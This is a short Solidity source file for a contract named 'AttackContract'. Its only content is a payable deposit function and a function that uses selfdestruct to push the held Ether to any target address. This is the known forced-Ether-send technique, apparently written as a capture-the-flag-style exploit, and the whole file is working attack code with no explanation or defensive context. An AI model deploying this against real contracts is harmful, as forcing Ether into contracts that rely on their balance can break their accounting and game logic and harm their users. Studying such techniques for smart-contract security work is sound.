pragma solidity ^0.8.17;

contract AttackContract {
    // Function to deposit Ether into the contract
    function deposit() external payable {}

    // Function to self-destruct and send the contract's balance to the target address
    function selfDestruct(address target) external {
        selfdestruct(payable(target));
    }
}
